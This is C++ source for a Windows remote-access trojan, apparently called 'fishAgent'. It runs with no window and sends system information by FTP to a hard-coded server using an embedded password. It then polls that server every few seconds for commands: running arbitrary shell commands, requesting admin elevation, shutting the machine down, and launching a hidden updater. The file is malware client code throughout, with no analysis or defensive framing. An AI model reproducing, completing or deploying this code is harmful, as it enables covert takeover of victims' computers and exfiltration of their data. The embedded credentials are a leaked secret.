#include <windows.h>
#include <wininet.h>
#include <cstdlib>
#include <tchar.h>
#include <thread>
#include <chrono>
#include <string>
#include <iostream>
#include <fstream>
#include <shlwapi.h>

#include "../include/core.h"
#include "../include/command.h"
#include "../include/system-info.h"
#include "../include/uuid.h"

using namespace std;

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib") // Nécessaire pour PathFileExistsA

// Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
string GetCommand() {
    string command = "NO_COMMAND";
    // Récupérer l'UUID pour l'envoyer au serveur
    // Si le fichier system_info.dat n'existe pas, le créer d'abord
    if (!PathFileExistsA((userFolder + "\\fish\\system_info.dat").c_str())) {
        createSystemInfoFile();
    }
    
    // Lire l'UUID du système
    string uuid = getUUID();

    HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        // Modifier l'URL pour inclure l'UUID dans la requête comme attendu par le serveur Python
        string url = "http://45.90.160.149:5000/command?input=" + uuid;
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[256];
            DWORD bytesRead = 0;

            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                command = buffer;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    return command;
}

// Fonction pour lancer les mises à jour
string userFolder = GetUserFolderPath();
string updaterFolder = userFolder + "\\fish";
string updaterPath = updaterFolder + "\\updater.exe";
void StartUpdate(const string& UpdaterPath) {
    ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
}

// Thread qui interroge périodiquement le serveur pour vérifier la commande.
void ListenForCommand() {
    while (true) {
        string cmd = GetCommand();

        if (cmd == "show") {
            ShowMessage();
        }
        else if (cmd == "update") {
            StartUpdate(updaterPath);
            this_thread::sleep_for(chrono::seconds(2));
            exit(0);
        }
        else if (cmd == "wind") {
            wind();
        }
        else if (cmd == "shtd") {
            shtd();
        }
        else if (cmd == "UAC") {
            RequestAdminPrivileges();
        }
        else if (cmd.substr(0, 6) == "shell ") {
            string shellCommand = cmd.substr(6); 
            ExecuteShellCommand(shellCommand);
        }
        else if (cmd == "KILLSWITCH") {
            // Gérer la commande KILLSWITCH - terminer le programme
            exit(0);
        }
        else if (cmd == "NO_COMMAND") {
            // Aucune commande à exécuter, continuer
        }

        this_thread::sleep_for(chrono::seconds(5));
    }
}

// Point d'entrée de l'application Windows (aucune console ne sera affichée)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Vérifier si le fichier system_info.dat existe, sinon le créer
    if (!PathFileExistsA((userFolder + "\\fish\\system_info.dat").c_str())) {
        createSystemInfoFile();
        // Uploader les infos système vers le serveur FTP si nécessaire
        uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", 
                        (userFolder + "\\fish\\system_info.dat").c_str(), "system_info.dat");
    }

    // Démarrer le thread d'écoute des commandes
    thread listener(ListenForCommand);
    listener.detach();

    // Maintenir l'application en exécution
    while (true) {
        this_thread::sleep_for(chrono::seconds(60));
    }

    return 0;
}